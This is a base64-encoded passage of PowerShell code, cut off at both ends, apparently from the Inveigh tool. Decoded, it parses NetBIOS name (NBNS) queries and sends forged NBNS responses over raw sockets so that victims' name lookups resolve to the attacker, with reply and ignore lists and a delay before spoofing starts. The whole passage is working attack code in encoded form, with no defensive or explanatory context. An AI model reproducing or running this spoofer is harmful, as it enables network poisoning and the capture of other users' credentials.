ICAgICAgICAgJHBheWxvYWRfYnl0ZXNbMCwxXSArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg1LDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMSwweDAwLDB4MDAsMHgwMCwweDAwLDB4MjAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfZGF0YQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlc1s0My4uNDRdKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgc3dpdGNoICgkTkJOU19xdWVyeV90eXBlKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnNDEtNDEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gJzAwJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJzQxLTQ0JwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfdHlwZSA9ICcwMycKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc0My00MScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3F1ZXJ5X3R5cGUgPSAnMjAnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnNDItNEMnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gJzFCJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJzQyLTREJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfdHlwZSA9ICcxQycKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICc0Mi00RScKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3F1ZXJ5X3R5cGUgPSAnMUQnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnNDItNEYnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV90eXBlID0gJzFFJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnkgPSBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzWzEzLi4oJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNCldKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnkgPSAkTkJOU19xdWVyeSAtcmVwbGFjZSAiLTAwIiwiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnkgPSAkTkJOU19xdWVyeS5TcGxpdCgiLSIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmdfZW5jb2RlZCA9IE5ldy1PYmplY3QgU3lzdGVtLlN0cmluZyAoJE5CTlNfcXVlcnksMCwkTkJOU19xdWVyeS5MZW5ndGgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmdfZW5jb2RlZCA9ICROQk5TX3F1ZXJ5X3N0cmluZ19lbmNvZGVkLlN1YnN0cmluZygwLCROQk5TX3F1ZXJ5X3N0cmluZ19lbmNvZGVkLkluZGV4T2YoIkNBIikpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmdfc3VidHJhY3RlZCA9ICIiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19xdWVyeV9zdHJpbmcgPSAiIgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJG4gPSAwCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfc3RyaW5nX3N1YiA9ICgoW0J5dGVdW0NoYXJdKCROQk5TX3F1ZXJ5X3N0cmluZ19lbmNvZGVkLlN1YnN0cmluZygkbiwxKSkpIC0gNjUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfc3RyaW5nX3N1YnRyYWN0ZWQgKz0gKFtTeXN0ZW0uQ29udmVydF06OlRvU3RyaW5nKCROQk5TX3F1ZXJ5X3N0cmluZ19zdWIsMTYpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRuICs9IDEKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVudGlsKCRuIC1ndCAoJE5CTlNfcXVlcnlfc3RyaW5nX2VuY29kZWQuTGVuZ3RoIC0gMSkpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbiA9IDAKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcXVlcnlfc3RyaW5nICs9IChbQ2hhcl0oW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkTkJOU19xdWVyeV9zdHJpbmdfc3VidHJhY3RlZC5TdWJzdHJpbmcoJG4sMiksMTYpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkbiArPSAyCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB1bnRpbCgkbiAtZ3QgKCROQk5TX3F1ZXJ5X3N0cmluZ19zdWJ0cmFjdGVkLkxlbmd0aCAtIDEpIC1vciAkTkJOU19xdWVyeV9zdHJpbmcuTGVuZ3RoIC1lcSAxNSkKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXF1ZXN0X2lnbm9yZSA9ICRmYWxzZQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROQk5TIC1lcSAnWScpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCRTcG9vZmVyTGVhcm5pbmcgLWVxICdZJyAtYW5kICRpbnZlaWdoLnZhbGlkX2hvc3RfbGlzdCAtbm90Y29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nIC1hbmQgW1N5c3RlbS5CaXRDb252ZXJ0ZXJdOjpUb1N0cmluZygkcGF5bG9hZF9ieXRlc1s0Li43XSkgLWVxICcwMC0wMS0wMC0wMCcgLWFuZCAkc291cmNlX0lQIC1uZSAkSVApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigoJE5CTlNfbGVhcm5pbmdfbG9nLkV4aXN0cyh7cGFyYW0oJHMpICRzIC1saWtlICIyMCogJE5CTlNfcXVlcnlfc3RyaW5nIn0pKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfbGVhcm5pbmdfcXVldWVfdGltZSA9IFtEYXRlVGltZV0kTkJOU19sZWFybmluZ19sb2cuRmluZCh7cGFyYW0oJHMpICRzIC1saWtlICIyMCogJE5CTlNfcXVlcnlfc3RyaW5nIn0pLlN1YlN0cmluZygwLDE5KQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKChHZXQtRGF0ZSkgLWdlICROQk5TX2xlYXJuaW5nX3F1ZXVlX3RpbWUuQWRkTWludXRlcygkU3Bvb2ZlckxlYXJuaW5nSW50ZXJ2YWwpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX2xlYXJuaW5nX2xvZy5SZW1vdmVBdCgkTkJOU19sZWFybmluZ19sb2cuRmluZEluZGV4KHtwYXJhbSgkcykgJHMgLWxpa2UgIjIwKiAkTkJOU19xdWVyeV9zdHJpbmcifSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfbGVhcm5pbmdfc2VuZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfbGVhcm5pbmdfc2VuZCA9ICRmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfbGVhcm5pbmdfc2VuZCA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCROQk5TX2xlYXJuaW5nX3NlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3RyYW5zYWN0aW9uX0lEID0gW1N0cmluZ10oMS4uMiB8IEZvckVhY2gtT2JqZWN0IHsiezA6WDJ9IiAtZiAoR2V0LVJhbmRvbSAtTWluaW11bSAxIC1NYXhpbXVtIDI1NSl9KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfdHJhbnNhY3Rpb25fSURfYnl0ZXMgPSAkTkJOU190cmFuc2FjdGlvbl9JRC5TcGxpdCgiICIpIHwgRm9yRWFjaC1PYmplY3R7W0NoYXJdW1N5c3RlbS5Db252ZXJ0XTo6VG9JbnQxNigkXywxNil9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU190cmFuc2FjdGlvbl9JRCA9ICROQk5TX3RyYW5zYWN0aW9uX0lEIC1yZXBsYWNlICIgIiwiLSIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX1VEUF9jbGllbnQgPSBuZXctT2JqZWN0IFN5c3RlbS5OZXQuU29ja2V0cy5VZHBDbGllbnQgMTM3CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19ob3N0bmFtZV9ieXRlcyA9ICRwYXlsb2FkX2J5dGVzWzEzLi4oJHBheWxvYWRfYnl0ZXMuTGVuZ3RoIC0gNSldCgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVxdWVzdF9wYWNrZXQgPSAkTkJOU190cmFuc2FjdGlvbl9JRF9ieXRlcyArCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDAxLDB4MTAsMHgwMCwweDAxLDB4MDAsMHgwMCwweDAwLDB4MDAsMHgwMCwweDAwLDB4MjAgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfaG9zdG5hbWVfYnl0ZXMgKwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgMHgwMCwweDIwLDB4MDAsMHgwMQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX2xlYXJuaW5nX2Rlc3RpbmF0aW9uX2VuZHBvaW50ID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LklQRW5kcG9pbnQoW0lQQWRkcmVzc106OmJyb2FkY2FzdCwxMzcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19VRFBfY2xpZW50LkNvbm5lY3QoJE5CTlNfbGVhcm5pbmdfZGVzdGluYXRpb25fZW5kcG9pbnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19VRFBfY2xpZW50LlNlbmQoJE5CTlNfcmVxdWVzdF9wYWNrZXQsJE5CTlNfcmVxdWVzdF9wYWNrZXQuTGVuZ3RoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfVURQX2NsaWVudC5DbG9zZSgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19sZWFybmluZ19sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAkTkJOU190cmFuc2FjdGlvbl9JRCAkTkJOU19xdWVyeV9zdHJpbmciKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJGludmVpZ2guY29uc29sZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTkJOUyByZXF1ZXN0IGZvciAkTkJOU19xdWVyeV9zdHJpbmcgc2VudCB0byAiICsgJE5CTlNfbGVhcm5pbmdfZGVzdGluYXRpb25fZW5kcG9pbnQuQWRkcmVzcy5JUEFkZHJlc3NUb1N0cmluZykKCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkaW52ZWlnaC5maWxlX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2dfZmlsZV9xdWV1ZS5BZGQoIiQoR2V0LURhdGUgLWZvcm1hdCAncycpIC0gTExNTlIgcmVxdWVzdCBmb3IgJE5CTlNfcXVlcnlfc3RyaW5nIHNlbnQgdG8gIiArICROQk5TX2xlYXJuaW5nX2Rlc3RpbmF0aW9uX2VuZHBvaW50LkFkZHJlc3MuSVBBZGRyZXNzVG9TdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJGludmVpZ2gubG9nX291dHB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkaW52ZWlnaC5sb2cuQWRkKCIkKEdldC1EYXRlIC1mb3JtYXQgJ3MnKSAtIExMTU5SIHJlcXVlc3QgZm9yICROQk5TX3F1ZXJ5X3N0cmluZyBzZW50IHRvICIgKyAkTkJOU19sZWFybmluZ19kZXN0aW5hdGlvbl9lbmRwb2ludC5BZGRyZXNzLklQQWRkcmVzc1RvU3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKCgkaW52ZWlnaC52YWxpZF9ob3N0X2xpc3QgLW5vdGNvbnRhaW5zICROQk5TX3F1ZXJ5X3N0cmluZyAtb3IgJFNwb29mZXJIb3N0c1JlcGx5IC1jb250YWlucyAkTkJOU19xdWVyeV9zdHJpbmcpIC1hbmQgKCEkU3Bvb2Zlckhvc3RzUmVwbHkgLW9yICRTcG9vZmVySG9zdHNSZXBseSAtY29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nKSAtYW5kICgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAhJFNwb29mZXJIb3N0c0lnbm9yZSAtb3IgJFNwb29mZXJIb3N0c0lnbm9yZSAtbm90Y29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nKSAtYW5kICghJFNwb29mZXJJUHNSZXBseSAtb3IgJFNwb29mZXJJUHNSZXBseSAtY29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgISRTcG9vZmVySVBzSWdub3JlIC1vciAkU3Bvb2ZlcklQc0lnbm9yZSAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkgLWFuZCAoJGludmVpZ2guc3Bvb2Zlcl9yZXBlYXQgLW9yICRpbnZlaWdoLklQX2NhcHR1cmVfbGlzdCAtbm90Y29udGFpbnMgJHNvdXJjZV9JUC5JUEFkZHJlc3NUb1N0cmluZykgLWFuZCAoJE5CTlNfcXVlcnlfc3RyaW5nLlRyaW0oKSAtbmUgJyonKSAtYW5kICgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkU3Bvb2ZlckxlYXJuaW5nIC1lcSAnTicgLW9yICgkU3Bvb2ZlckxlYXJuaW5nIC1lcSAnWScgLWFuZCAhJFNwb29mZXJMZWFybmluZ0RlbGF5KSAtb3IgKCRTcG9vZmVyTGVhcm5pbmdEZWxheSAtYW5kICRzcG9vZmVyX2xlYXJuaW5nX3N0b3B3YXRjaC5FbGFwc2VkIC1nZSAkc3Bvb2Zlcl9sZWFybmluZ19kZWxheSkpIC1hbmQgKCRzb3VyY2VfSVAgLW5lICRJUCkgLWFuZCAoCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNUeXBlcyAtY29udGFpbnMgJE5CTlNfcXVlcnlfdHlwZSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYoJFNwb29mZXJMZWFybmluZyAtZXEgJ04nIC1vciAhJE5CTlNfbGVhcm5pbmdfbG9nLkV4aXN0cyh7cGFyYW0oJHMpICRzIC1saWtlICIqICIgKyBbU3lzdGVtLkJpdENvbnZlcnRlcl06OlRvU3RyaW5nKCRwYXlsb2FkX2J5dGVzWzAuLjFdKSArICIgKiJ9KSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfc2VuZF9zb2NrZXQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlNvY2tldChbU3lzdGVtLk5ldC5Tb2NrZXRzLkFkZHJlc3NGYW1pbHldOjpJbnRlck5ldHdvcmssW1N5c3RlbS5OZXQuU29ja2V0cy5Tb2NrZXRUeXBlXTo6UmF3LFtTeXN0ZW0uTmV0LlNvY2tldHMuUHJvdG9jb2xUeXBlXTo6VWRwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfc2VuZF9zb2NrZXQuU2VuZEJ1ZmZlclNpemUgPSAxMDI0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19kZXN0aW5hdGlvbl9wb2ludCA9IE5ldy1PYmplY3QgTmV0LklQRW5kcG9pbnQoJHNvdXJjZV9JUCwkZW5kcG9pbnRfc291cmNlX3BvcnQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19zZW5kX3NvY2tldC5TZW5kVG8oJE5CTlNfcmVzcG9uc2VfcGFja2V0LCROQk5TX2Rlc3RpbmF0aW9uX3BvaW50KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfc2VuZF9zb2NrZXQuQ2xvc2UoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItIHJlc3BvbnNlIHNlbnQiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXF1ZXN0X2lnbm9yZSA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZigkc291cmNlX0lQIC1lcSAkSVAgLWFuZCAkTkJOU19sZWFybmluZ19sb2cuRXhpc3RzKHtwYXJhbSgkcykgJHMgLWxpa2UgIiogIiArIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMC4uMV0pICsgIiAqIn0pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXF1ZXN0X2lnbm9yZSA9ICR0cnVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCROQk5TVHlwZXMgLW5vdGNvbnRhaW5zICROQk5TX3F1ZXJ5X3R5cGUpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBkaXNhYmxlZCBOQk5TIHR5cGUiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySG9zdHNSZXBseSAtYW5kICRTcG9vZmVySG9zdHNSZXBseSAtbm90Y29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJE5CTlNfcXVlcnlfc3RyaW5nIGlzIG5vdCBvbiByZXBseSBsaXN0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2Zlckhvc3RzSWdub3JlIC1hbmQgJFNwb29mZXJIb3N0c0lnbm9yZSAtY29udGFpbnMgJE5CTlNfcXVlcnlfc3RyaW5nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gJE5CTlNfcXVlcnlfc3RyaW5nIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkU3Bvb2ZlcklQc1JlcGx5IC1hbmQgJFNwb29mZXJJUHNSZXBseSAtbm90Y29udGFpbnMgJHNvdXJjZV9JUCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJE5CTlNfcmVzcG9uc2VfbWVzc2FnZSA9ICItICRzb3VyY2VfSVAgaXMgbm90IG9uIHJlcGx5IGxpc3QiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRTcG9vZmVySVBzSWdub3JlIC1hbmQgJFNwb29mZXJJUHNJZ25vcmUgLWNvbnRhaW5zICRzb3VyY2VfSVApCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkc291cmNlX0lQIGlzIG9uIGlnbm9yZSBsaXN0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkTkJOU19xdWVyeV9zdHJpbmcuVHJpbSgpIC1lcSAnKicpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBOQlNUQVQgcmVxdWVzdCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJGludmVpZ2gudmFsaWRfaG9zdF9saXN0IC1jb250YWlucyAkTkJOU19xdWVyeV9zdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSAkTkJOU19xdWVyeV9zdHJpbmcgaXMgYSB2YWxpZCBob3N0IgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZigkaW52ZWlnaC5JUF9jYXB0dXJlX2xpc3QgLWNvbnRhaW5zICRzb3VyY2VfSVAuSVBBZGRyZXNzVG9TdHJpbmcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICROQk5TX3Jlc3BvbnNlX21lc3NhZ2UgPSAiLSBwcmV2aW91cyBjYXB0dXJlIGZyb20gJHNvdXJjZV9JUCIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbHNlaWYoJFNwb29mZXJMZWFybmluZ0RlbGF5IC1hbmQgJHNwb29mZXJfbGVhcm5pbmdfc3RvcHdhdGNoLkVsYXBzZWQgLWx0ICRzcG9vZmVyX2xlYXJuaW5nX2RlbGF5KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkTkJOU19yZXNwb25zZV9tZXNzYWdlID0gIi0gIiArIFtJbnRdKCRTcG9vZmVyTGVhcm5pbmdEZWxheSAtICRzcG9vZmVyX2xlYXJuaW5nX3N0b3B3YXRjaC5FbGFwc2VkLlRvdGFsTWludXRlcykgKyAiIG1pbnV0ZShzKSB1bnRpbCBzcG9vZmluZyBzdGFydHMiCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZWxzZWlmKCRzb3VyY2VfSVAgLWVxICRJUCAtYW5kICEkTkJOU19sZWFybmluZ19sb2cuRXhpc3RzKHtwYXJhbSgkcykgJHMgLWxpa2UgIiogIiArIFtTeXN0ZW0uQml0Q29udmVydGVyXTo6VG9TdHJpbmcoJHBheWxvYWRfYnl0ZXNbMC4uMV0pICsgIiAqIn0pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIC